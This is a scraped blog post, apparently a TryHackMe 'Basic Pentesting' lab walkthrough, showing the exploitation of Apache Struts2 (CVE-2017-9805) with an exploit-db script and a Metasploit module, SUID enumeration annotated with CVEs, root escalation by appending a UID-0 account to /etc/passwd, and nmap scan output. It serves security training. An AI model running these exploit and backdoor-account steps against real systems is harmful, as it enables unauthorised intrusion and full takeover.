/bin/ping6 -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping -rwsr-sr-x 1 daemon daemon 51K Jan 14 2016 /usr/bin/at --- RTru64_UNIX_4.0g(CVE-2002-1614) -rwsr-xr-x 1 root root 15K Jan 17 2016 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 23K Jan 17 2016 /usr/bin/pkexec --- Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) -rwsr-xr-x 1 root root 31K Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 2.4M Nov 24 2016 /usr/bin/vim.basic -rwsr-xr-- 1 root messagebus 42K Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 139K Jan 28 2017 /bin/ntfs-3g --- Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017) -rwsr-xr-x 1 root root 10K Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 40K May 16 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 53K May 16 2017 /usr/bin/passwd --- Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 74K May 16 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 49K May 16 2017 /usr/bin/chfn --- SuSE_9.3/10 -rwsr-xr-x 1 root root 39K May 16 2017 /usr/bin/newgrp --- HP-UX_10.20 -rwsr-xr-x 1 root root 40K May 16 2017 /bin/su -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newuidmap -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newgidmap -rwsr-xr-x 1 root root 39K Jun 14 2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic -rwsr-xr-x 1 root root 134K Jul 4 2017 /usr/bin/sudo --- /sudo$ -rwsr-sr-x 1 root root 84K Nov 30 2017 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 27K Nov 30 2017 /bin/umount --- BSD/Linux(08-1996) -rwsr-xr-x 1 root root 40K Nov 30 2017 /bin/mount --- Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 419K Jan 18 2018 /usr/lib/openssh/ssh-keysign  Port 8080 - HTTP Alright, we found Apache Tomcat server running on the server. The credentials also need to be bruteforced to access. But again, let‚Äôs refer to the file dev.txt\n2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K So, two things, first struts (many exploits of apache struts) and other thing mentioned is REST API.\nLet‚Äôs search for exploits:\nAlright, this exploit seems like the one! linux/remote/42627.py\nRunning the exploit and wasn‚Äôt successful since we don‚Äôt have the right path to the REST API. Tried custom ones, didn‚Äôt work. Googled the exploitation of this vulnerability and found out this cool article ( Detecting and Exploiting the Java Struts2 REST Plugin vulnerability ‚Äî CVE-2017‚Äì9805 )\nHe deployed the custom version (from dev.txt), we also have the custom version! Let‚Äôs try it!\nThe path becomes: http://10.10.137.134:8080/struts2-rest-showcase-2.5.12\nWorked fine and we got redirected, let‚Äôs pass this to the exploit!\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# python3 42627.py CVE: 2017-9805 - Apache Struts2 Rest Plugin Xstream RCE [*] Warflop - http://securityattack.com.br [*] Greatz: Pimps \u0026 G4mbl3r [*] Use: python struts2.py URL COMMAND [*] Example: python struts2.py http://sitevulnerable.com/struts2-rest-showcase/orders/3 id The argument becomes:\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[~/THM/Basic Pentesting] ‚îî‚îÄ# python3 42627.py http://10.10.137.134:8080/struts2-rest-showcase-2.5.12/orders/2 id doctype htmlhtml lang=\"en\"headtitleHTTP Status 500 ‚Äì Internal Server Errortitlestyle type=\"text/css\"h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,A rial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12 px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}styleheadbodyh1HTTP Status 500 ‚Äì Internal Server Errorh1hr class=\"line\" /pbTypeb Exceptio n ReportppbMessageb java.lang.String cannot be cast to java.security.Provider$Service : java.lang.String cannot be cast to java.security.Provider$ServiceppbDescriptionb The server encountered an unexpected condition that prevented it from fulfilling the request.ppbExceptionbpprecom.thoughtworks.xstream.converters.ConversionException: java.lang.String cannot be cast to java.security.Pr ovider$Service : java.lang.String cannot be cast to java.security.Provider$Service ---- Debugging information ---- message : java.lang.String cannot be cast to java.security.Provider$Service cause-exception : java.lang.ClassCastException cause-message : java.lang.String cannot be cast to java.security.Provider$Service class : java.util.HashMap required-type : java.util.HashMap converter-type : com.thoughtworks.xstream.converters.collections.MapConverter path : \u0026#47;map\u0026#47;entry line number : 49 version : 1.4.8 ------------------------------- com.thoughtworks.xstream.core.TreeUnmarshaller.convert(TreeUnmarshaller.java:79) com.thoughtworks.xstream.core.AbstractReferenceUnmarshaller.convert(AbstractReferenceUnmarshaller.java:65) com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:66) com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:50) com.thoughtworks.xstream.core.TreeUnmarshaller.start(TreeUnmarshaller.java:134) com.thoughtworks.xstream.core.AbstractTreeMarshallingStrategy.unmarshal(AbstractTreeMarshallingStrategy.java:32) com.thoughtworks.xstream.XStream.unmarshal(XStream.java:1206) com.thoughtworks.xstream.XStream.unmarshal(XStream.java:1190) com.thoughtworks.xstream.XStream.fromXML(XStream.java:1120) org.apache.struts2.rest.handler.XStreamHandler.toObject(XStreamHandler.java:45) org.apache.struts2.rest.ContentTypeInterceptor.intercept(ContentTypeInterceptor.java:60) com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:247) org.apache.struts2.rest.RestActionInvocation.invoke(RestActionInvocation.java:135) com.opensymphony.xwork2.interceptor.ParametersInterceptor.doIntercept(ParametersInterceptor.java:134) com.opensymphony.xwork2.interceptor.MethodFilterInterceptor.intercept(MethodFilterInterceptor.java:98) com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:247) org.apache.struts2.rest.RestActionInvocation.invoke(RestActionInvocation.java:135) com.opensymphony.xwork2.interceptor.StaticParametersInterceptor.intercept(StaticParametersInterceptor.java:199) com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:247) org.apache.struts2.rest.RestActionInvocation.invoke(RestActionInvocation.java:135) Alright, errors üòÖ ‚Äî Let‚Äôs try good ol' metasploit maybe? Because it also contains a exploit for this.\nmsf6  search struts Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/struts2_code_exec_showcase 2017-07-07 excellent Yes Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution 1 exploit/multi/http/struts2_content_type_ognl 2017-03-07 excellent Yes Apache Struts Jakarta Multipart Parser OGNL Injection 2 exploit/multi/http/struts2_multi_eval_ognl 2020-09-14 excellent Yes Apache Struts 2 Forced Multi OGNL Evaluation 3 exploit/multi/http/struts2_namespace_ognl 2018-08-22 excellent Yes Apache Struts 2 Namespace Redirect OGNL Injection 4 exploit/multi/http/struts2_rest_xstream 2017-09-05 excellent Yes Apache Struts 2 REST Plugin XStream RCE 5 exploit/multi/http/struts_code_exec 2010-07-13 good No Apache Struts Remote Command Execution 6 exploit/multi/http/struts_code_exec_classloader 2014-03-06 manual No Apache Struts ClassLoader Manipulation Remote Code Execution 7 exploit/multi/http/struts_code_exec_exception_delegator 2012-01-06 excellent No Apache Struts Remote Command Execution 8 exploit/multi/http/struts_code_exec_parameters 2011-10-01 excellent Yes Apache Struts ParametersInterceptor Remote Code Execution 9 exploit/multi/http/struts_default_action_mapper 2013-07-02 excellent Yes Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution 10 exploit/multi/http/struts_dev_mode 2012-01-06 excellent Yes Apache Struts 2 Developer Mode OGNL Execution 11 exploit/multi/http/struts_dmi_exec 2016-04-27 excellent Yes Apache Struts Dynamic Method Invocation Remote Code Execution 12 exploit/multi/http/struts_dmi_rest_exec 2016-06-01 excellent Yes Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution 13 exploit/multi/http/struts_include_params 2013-05-24 great Yes Apache Struts includeParams Remote Code Execution We can use exploit/multi/http/struts2_rest_xstream\nYosh, RCE! ü§§\nNow let‚Äôs get to privesc after getting an interactive shell (will leave this upto you to figure out)\nLet‚Äôs run linpeas.sh and see what we can use to privesc now! ‚Äî Skipping results\nRan SUID3NUM against the machine and found out an interesting binary (which we missed in linpeas, results hahaha :feels-embarrased-man xD)\nWe can add the following one liner in /etc/passwd end and get our user new user pentest with password pentest123 with uid and gid 0 ‚Üí root\nLet‚Äôs generate password compatible for /etc/passwd\ntomcat9@basic2:/$ openssl passwd -1 -salt pentest pentest123 $1$pentest$DBbvyULdY7MsoZ7AcK8ew/ Let‚Äôs add the following in the end of /etc/passwd\npentest:$1$pentest$DBbvyULdY7MsoZ7AcK8ew/:0:0::/root:/bin/bash Format is:\nusername:passwordHash:uid:gid:userDescription:homeDirectory:shell\nI‚Äôll leave it to to you to figure out how to exim vim! üòõ\nAaaand, we‚Äôre root yet again! XD\n Things learnt:  Be patient while bruteforcing (if it‚Äôs SSH or any other slow protocol) Remember to enumerate every port and try all relevant enumeration scripts! Check all open ports! üòê  ","wordCount":"3705","inLanguage":"en","image":"https://umar0x01.sh/images/overpass-thm/Untitled%202.png","datePublished":"2021-04-11T00:00:00Z","dateModified":"2021-04-11T00:00:00Z","author":{"@type":"Person","name":"Umar_0x01"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://umar0x01.sh/post/thm-basic_pentesting/"},"publisher":{"@type":"Organization","name":"Umar_0x01 ‚Äì Pentester | Programmer | Your average sakurity guy ( Õ°~ Õú ñ Õ°¬∞)","logo":{"@type":"ImageObject","url":"https://umar0x01.sh/favicon/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a class=label_text_header href=https://umar0x01.sh accesskey=h title="> umar_0x01 | blog (Alt + H)"><span id=cusor_blink>></span> umar_0x01 | blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://umar0x01.sh/archives/ title=Posts><span>Posts</span></a></li><li><a href=https://umar0x01.sh/anime/ title=Anime><span>Anime</span></a></li><li><a href=https://umar0x01.sh/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://umar0x01.sh/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://umar0x01.sh/tags/ title=Tags><span>Tags</span></a></li></ul></nav><script type=text/javascript>var cursor=!0,speed=500;setInterval(()=>{cursor?(document.getElementById('cusor_blink').style.opacity=0,cursor=!1):(document.getElementById('cusor_blink').style.opacity=1,cursor=!0)},speed)</script></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://umar0x01.sh>Home</a>&nbsp;¬ª&nbsp;<a href=https://umar0x01.sh/post/>Posts</a></div><h1 class=post-title>TryHackMe - Basic Pentesting</h1><div class=post-description>Walkthrough of the boot2root machine Basic Pentesting on TryHackMe - https://tryhackme.com/room/basicpentestingjt</div><div class=post-meta>April 11, 2021&nbsp;¬∑&nbsp;18 min&nbsp;¬∑&nbsp;Umar_0x01</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><div class=inner><ul><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#port-80-http aria-label="Port 80 (HTTP)">Port 80 (HTTP)</a></li><li><a href=#port-445---smb aria-label="Port 445 - SMB">Port 445 - SMB</a></li></ul></li><li><a href=#initial-user aria-label="Initial User">Initial User</a></li><li><a href=#privileges-escalation aria-label="Privileges Escalation">Privileges Escalation</a></li><li><a href=#root-user aria-label="Root User!">Root User!</a></li><li><a href=#alternate-method-to-privesc aria-label="Alternate method to PrivEsc!">Alternate method to PrivEsc!</a><ul><li><a href=#port-8080---http aria-label="Port 8080 - HTTP">Port 8080 - HTTP</a></li></ul></li><li><a href=#things-learnt aria-label="Things learnt:">Things learnt:</a></li></ul></div></details></div><div class=post-content><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><hr><p><strong>Link:</strong> <a href=https://tryhackme.com/room/basicpentestingjt>https://tryhackme.com/room/basicpentestingjt</a></p><p><strong>Author:</strong> <a href=https://tryhackme.com/p/ashu>https://tryhackme.com/p/ashu</a></p><p><strong>Host:</strong> 10.10.137.134</p><hr><p>Let&rsquo;s do an <code>NMAP</code> scan against the host with <code>safe scripts</code> and <code>version fingerprinting</code> of <strong>services</strong> running on the machine.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>                                                                  
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> nmap <span style=color:#f92672>-</span>sC <span style=color:#f92672>-</span>sV <span style=color:#f92672>-</span>v <span style=color:#f92672>-</span>Pn <span style=color:#f92672>-</span>n <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>                                                                  
Host discovery <span style=color:#a6e22e>disabled</span> <span style=color:#f92672>(-</span>Pn<span style=color:#f92672>).</span> All addresses will be marked <span style=color:#960050;background-color:#1e0010>&#39;</span>up<span style=color:#960050;background-color:#1e0010>&#39;</span> and scan times will be slower<span style=color:#f92672>.</span>
Starting Nmap <span style=color:#ae81ff>7.91</span> <span style=color:#f92672>(</span> https<span style=color:#f92672>:</span><span style=color:#75715e>//nmap.org ) at 2021-04-11 03:47 PKT     
</span><span style=color:#75715e></span>NSE: Loaded <span style=color:#ae81ff>153</span> scripts <span style=color:#66d9ef>for</span> scanning<span style=color:#f92672>.</span>
NSE: Script Pre<span style=color:#f92672>-</span>scanning<span style=color:#f92672>.</span>                   
Initiating NSE at <span style=color:#ae81ff>03</span><span style=color:#f92672>:</span><span style=color:#ae81ff>47</span>                     
Completed NSE at <span style=color:#ae81ff>03</span><span style=color:#f92672>:</span><span style=color:#ae81ff>47</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0.00</span>s elapsed
<span style=color:#f92672>...</span>
Scanning <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>1000</span> ports<span style=color:#f92672>]</span>                                                                      
Discovered open port <span style=color:#ae81ff>22</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>                                                             
Discovered open port <span style=color:#ae81ff>445</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>
Discovered open port <span style=color:#ae81ff>139</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>   
Discovered open port <span style=color:#ae81ff>80</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#a6e22e>137</span><span style=color:#f92672>.</span><span style=color:#a6e22e>134</span>
<span style=color:#f92672>...</span>
PORT    STATE SERVICE     VERSION                                                                        
<span style=color:#ae81ff>22</span><span style=color:#f92672>/</span>tcp  open  ssh         OpenSSH <span style=color:#ae81ff>7.2</span>p2 Ubuntu <span style=color:#ae81ff>4</span>ubuntu2<span style=color:#f92672>.</span><span style=color:#a6e22e>4</span> <span style=color:#f92672>(</span>Ubuntu Linux<span style=color:#f92672>;</span> protocol <span style=color:#ae81ff>2.0</span><span style=color:#f92672>)</span>
<span style=color:#f92672>|</span> ssh<span style=color:#f92672>-</span>hostkey<span style=color:#f92672>:</span> 
<span style=color:#f92672>|</span>   <span style=color:#ae81ff>2048</span> db<span style=color:#f92672>:</span><span style=color:#ae81ff>45</span><span style=color:#f92672>:</span>cb<span style=color:#f92672>:</span>be<span style=color:#f92672>:</span><span style=color:#ae81ff>4</span>a<span style=color:#f92672>:</span><span style=color:#ae81ff>8</span>b<span style=color:#f92672>:</span><span style=color:#ae81ff>71</span><span style=color:#f92672>:</span>f8<span style=color:#f92672>:</span>e9<span style=color:#f92672>:</span><span style=color:#ae81ff>31</span><span style=color:#f92672>:</span><span style=color:#ae81ff>42</span><span style=color:#f92672>:</span>ae<span style=color:#f92672>:</span>ff<span style=color:#f92672>:</span>f8<span style=color:#f92672>:</span><span style=color:#ae81ff>45</span><span style=color:#f92672>:</span>e4 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
<span style=color:#f92672>|</span>   <span style=color:#ae81ff>256</span> <span style=color:#ae81ff>09</span><span style=color:#f92672>:</span>b9<span style=color:#f92672>:</span>b9<span style=color:#f92672>:</span><span style=color:#ae81ff>1</span>c<span style=color:#f92672>:</span>e0<span style=color:#f92672>:</span>bf<span style=color:#f92672>:</span><span style=color:#ae81ff>0</span>e<span style=color:#f92672>:</span><span style=color:#ae81ff>1</span>c<span style=color:#f92672>:</span><span style=color:#ae81ff>6f</span><span style=color:#f92672>:</span><span style=color:#ae81ff>7f</span><span style=color:#f92672>:</span>fe<span style=color:#f92672>:</span><span style=color:#ae81ff>8</span>e<span style=color:#f92672>:</span><span style=color:#ae81ff>5f</span><span style=color:#f92672>:</span><span style=color:#ae81ff>20</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1</span>b<span style=color:#f92672>:</span>ce <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
<span style=color:#f92672>|</span>_  <span style=color:#ae81ff>256</span> a5<span style=color:#f92672>:</span><span style=color:#ae81ff>68</span><span style=color:#f92672>:</span><span style=color:#ae81ff>2</span>b<span style=color:#f92672>:</span><span style=color:#ae81ff>22</span><span style=color:#f92672>:</span><span style=color:#ae81ff>5f</span><span style=color:#f92672>:</span><span style=color:#ae81ff>98</span><span style=color:#f92672>:</span><span style=color:#ae81ff>4</span>a<span style=color:#f92672>:</span><span style=color:#ae81ff>62</span><span style=color:#f92672>:</span><span style=color:#ae81ff>21</span><span style=color:#f92672>:</span><span style=color:#ae81ff>3</span>d<span style=color:#f92672>:</span>a2<span style=color:#f92672>:</span>e2<span style=color:#f92672>:</span>c5<span style=color:#f92672>:</span>a9<span style=color:#f92672>:</span>f7<span style=color:#f92672>:</span>c2 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
<span style=color:#ae81ff>80</span><span style=color:#f92672>/</span>tcp  open  http        Apache httpd <span style=color:#ae81ff>2.4</span><span style=color:#f92672>.</span><span style=color:#a6e22e>18</span> <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
<span style=color:#f92672>|</span> http<span style=color:#f92672>-</span>methods<span style=color:#f92672>:</span> 
<span style=color:#f92672>|</span>_  Supported Methods<span style=color:#f92672>:</span> POST OPTIONS GET HEAD
<span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header<span style=color:#f92672>:</span> Apache<span style=color:#f92672>/</span><span style=color:#ae81ff>2.4</span><span style=color:#f92672>.</span><span style=color:#a6e22e>18</span> <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
<span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>title<span style=color:#f92672>:</span> Site does not have a <span style=color:#a6e22e>title</span> <span style=color:#f92672>(</span>text<span style=color:#f92672>/</span>html<span style=color:#f92672>).</span>
<span style=color:#ae81ff>139</span><span style=color:#f92672>/</span>tcp open  netbios<span style=color:#f92672>-</span>ssn Samba smbd <span style=color:#ae81ff>3.</span>X <span style=color:#f92672>-</span> <span style=color:#ae81ff>4.</span>X <span style=color:#f92672>(</span>workgroup<span style=color:#f92672>:</span> WORKGROUP<span style=color:#f92672>)</span>
<span style=color:#ae81ff>445</span><span style=color:#f92672>/</span>tcp open  netbios<span style=color:#f92672>-</span>ssn Samba smbd <span style=color:#ae81ff>4.3</span><span style=color:#f92672>.</span><span style=color:#a6e22e>11</span><span style=color:#f92672>-</span>Ubuntu <span style=color:#f92672>(</span>workgroup<span style=color:#f92672>:</span> WORKGROUP<span style=color:#f92672>)</span>
Service Info<span style=color:#f92672>:</span> Host<span style=color:#f92672>:</span> BASIC2<span style=color:#f92672>;</span> OS<span style=color:#f92672>:</span> Linux<span style=color:#f92672>;</span> CPE<span style=color:#f92672>:</span> cpe<span style=color:#f92672>:/</span>o<span style=color:#f92672>:</span>linux<span style=color:#f92672>:</span>linux_kernel

Host script results<span style=color:#f92672>:</span>
<span style=color:#f92672>|</span>_clock<span style=color:#f92672>-</span>skew<span style=color:#f92672>:</span> mean<span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>h20m00s<span style=color:#f92672>,</span> deviation<span style=color:#f92672>:</span> <span style=color:#ae81ff>2</span>h18m35s<span style=color:#f92672>,</span> median<span style=color:#f92672>:</span> <span style=color:#ae81ff>0</span>s
<span style=color:#f92672>|</span> nbstat<span style=color:#f92672>:</span> NetBIOS name<span style=color:#f92672>:</span> BASIC2<span style=color:#f92672>,</span> NetBIOS user<span style=color:#f92672>:</span> <span style=color:#f92672>&lt;</span>unknown<span style=color:#f92672>&gt;,</span> NetBIOS MAC<span style=color:#f92672>:</span> <span style=color:#f92672>&lt;</span>unknown<span style=color:#f92672>&gt;</span> <span style=color:#f92672>(</span>unknown<span style=color:#f92672>)</span>
<span style=color:#f92672>|</span> Names<span style=color:#f92672>:</span>
<span style=color:#f92672>|</span>   BASIC2<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>00</span><span style=color:#f92672>&gt;</span>           Flags<span style=color:#f92672>:</span> <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>|</span>   BASIC2<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>03</span><span style=color:#f92672>&gt;</span>           Flags<span style=color:#f92672>:</span> <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>|</span>   BASIC2<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>20</span><span style=color:#f92672>&gt;</span>           Flags<span style=color:#f92672>:</span> <span style=color:#f92672>&lt;</span>unique<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>|</span>   WORKGROUP<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>00</span><span style=color:#f92672>&gt;</span>        Flags<span style=color:#f92672>:</span> <span style=color:#f92672>&lt;</span>group<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>|</span>_  WORKGROUP<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>1</span>e<span style=color:#f92672>&gt;</span>        Flags<span style=color:#f92672>:</span> <span style=color:#f92672>&lt;</span>group<span style=color:#f92672>&gt;&lt;</span>active<span style=color:#f92672>&gt;</span>
<span style=color:#f92672>|</span> smb<span style=color:#f92672>-</span>os<span style=color:#f92672>-</span>discovery<span style=color:#f92672>:</span> 
<span style=color:#f92672>|</span>   OS<span style=color:#f92672>:</span> Windows <span style=color:#ae81ff>6.1</span> <span style=color:#f92672>(</span>Samba <span style=color:#ae81ff>4.3</span><span style=color:#f92672>.</span><span style=color:#a6e22e>11</span><span style=color:#f92672>-</span>Ubuntu<span style=color:#f92672>)</span>
<span style=color:#f92672>|</span>   Computer name<span style=color:#f92672>:</span> basic2
<span style=color:#f92672>|</span>   NetBIOS computer name<span style=color:#f92672>:</span> BASIC2<span style=color:#960050;background-color:#1e0010>\</span>x00
<span style=color:#f92672>|</span>   Domain name<span style=color:#f92672>:</span> <span style=color:#960050;background-color:#1e0010>\</span>x00
<span style=color:#f92672>|</span>   FQDN<span style=color:#f92672>:</span> basic2
<span style=color:#f92672>|</span>_  System time<span style=color:#f92672>:</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>10</span>T18<span style=color:#f92672>:</span><span style=color:#ae81ff>48</span><span style=color:#f92672>:</span><span style=color:#ae81ff>12</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>:</span><span style=color:#ae81ff>00</span>
<span style=color:#f92672>|</span> smb<span style=color:#f92672>-</span>security<span style=color:#f92672>-</span>mode<span style=color:#f92672>:</span> 
<span style=color:#f92672>|</span>   account_used<span style=color:#f92672>:</span> guest
<span style=color:#f92672>|</span>   authentication_level<span style=color:#f92672>:</span> user
<span style=color:#f92672>|</span>   challenge_response<span style=color:#f92672>:</span> supported
<span style=color:#f92672>|</span>_  message_signing<span style=color:#f92672>:</span> disabled <span style=color:#f92672>(</span>dangerous<span style=color:#f92672>,</span> but <span style=color:#66d9ef>default</span><span style=color:#f92672>)</span>
<span style=color:#f92672>|</span> smb2<span style=color:#f92672>-</span>security<span style=color:#f92672>-</span>mode<span style=color:#f92672>:</span> 
<span style=color:#f92672>|</span>   <span style=color:#ae81ff>2.02</span><span style=color:#f92672>:</span> 
<span style=color:#f92672>|</span>_    Message signing enabled but not required
<span style=color:#f92672>|</span> smb2<span style=color:#f92672>-</span>time<span style=color:#f92672>:</span> 
<span style=color:#f92672>|</span>   date<span style=color:#f92672>:</span> <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>10</span>T22<span style=color:#f92672>:</span><span style=color:#ae81ff>48</span><span style=color:#f92672>:</span><span style=color:#ae81ff>11</span>
<span style=color:#f92672>|</span>_  start_date<span style=color:#f92672>:</span> N<span style=color:#f92672>/</span>A

NSE: Script Post<span style=color:#f92672>-</span>scanning<span style=color:#f92672>.</span>
Initiating NSE at <span style=color:#ae81ff>03</span><span style=color:#f92672>:</span><span style=color:#ae81ff>48</span>
Completed NSE at <span style=color:#ae81ff>03</span><span style=color:#f92672>:</span><span style=color:#ae81ff>48</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0.00</span>s elapsed
Initiating NSE at <span style=color:#ae81ff>03</span><span style=color:#f92672>:</span><span style=color:#ae81ff>48</span>
Completed NSE at <span style=color:#ae81ff>03</span><span style=color:#f92672>:</span><span style=color:#ae81ff>48</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0.00</span>s elapsed
Initiating NSE at <span style=color:#ae81ff>03</span><span style=color:#f92672>:</span><span style=color:#ae81ff>48</span>
Completed NSE at <span style=color:#ae81ff>03</span><span style=color:#f92672>:</span><span style=color:#ae81ff>48</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0.00</span>s elapsed
Read data files from<span style=color:#f92672>:</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/../</span>share<span style=color:#f92672>/</span>nmap
Service detection performed<span style=color:#f92672>.</span> Please report any incorrect results at https<span style=color:#f92672>:</span><span style=color:#75715e>//nmap.org/submit/ .
